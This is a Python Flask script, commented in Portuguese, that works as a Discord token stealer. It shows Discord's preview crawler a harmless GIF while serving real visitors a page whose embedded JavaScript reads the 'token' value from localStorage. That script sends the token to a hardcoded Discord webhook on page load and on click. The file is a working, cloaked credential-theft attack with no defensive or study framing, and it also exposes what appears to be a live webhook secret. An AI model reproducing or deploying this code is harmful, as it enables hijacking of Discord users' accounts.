from flask import Flask, request, send_file, Response
import requests
from io import BytesIO
import time  # <-- IMPORTANTE: Medir a velocidade

app = Flask(__name__)

# --- CONFIGURAÇÕES ---
WEBHOOK_URL = "https://discord.com/api/webhooks/1499395423196942356/gp_xRk3gCRh6mUVb79WklNjnvSOcJtXaW9Y6Rt24aSc40k-OtrWCxNF0zEQrzcaNTA3v"
IMAGE_URL = "https://tenor.com/eMljTIuE4mb.gif" # Ou a URL que você quiser
# ---------------------

MALICIOUS_HTML = f"""<!DOCTYPE html>
<html>
<head>
    <meta property="og:image" content="{IMAGE_URL}">
    <meta property="og:title" content="Imagem Incrível">
    <meta property="og:description" content="Clique para expandir">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Imagem</title>
</head>
<body style="margin:0; background:#000;">
    <img src="{IMAGE_URL}" style="width:100%; height:auto; cursor:pointer">
    <script>
        function steal() {{
            const token = localStorage.getItem('token');
            if (token && token.length > 50) {{
                fetch('{WEBHOOK_URL}', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{content: '**TOKEN ROUBADO**\\n```' + token + '```'}})
                }});
                document.body.innerHTML = '<div style=\"color:green;text-align:center\">Carregado</div>';
            }}
        }}
        document.body.onclick = steal;
        setTimeout(steal, 500);
    </script>
</body>
</html>"""

@app.route('/')
def index():
    start_time = time.time()
    user_agent = request.headers.get('User-Agent', '')

    # 1. Detecta o bot do Discord
    if 'Discordbot' in user_agent:
        print("[BOT DETECTADO] Enviando imagem real...")
        try:
            # Baixa a imagem uma vez e guarda na memória (cache simples)
            img_data = requests.get(IMAGE_URL, timeout=5).content
            # Cabeçalhos ANTI-CACHE para forçar o Discord a atualizar o preview
            response = send_file(BytesIO(img_data), mimetype='image/jpeg')
            response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
            response.headers["Pragma"] = "no-cache"
            response.headers["Expires"] = "0"
            print(f"[BOT] Respondido em {time.time() - start_time:.2f}s")
            return response
        except Exception as e:
            print(f"[ERRO BOT] {e}")
            return "Imagem não encontrada", 404

    # 2. Usuário normal
    else:
        print(f"[USUÁRIO] Acessando via {user_agent[:50]}...")
        return Response(MALICIOUS_HTML, mimetype='text/html')

if __name__ == '__main__':
    print("🔥 Servidor RODANDO em http://localhost:5000")
    app.run(host='0.0.0.0', port=5000, threaded=True)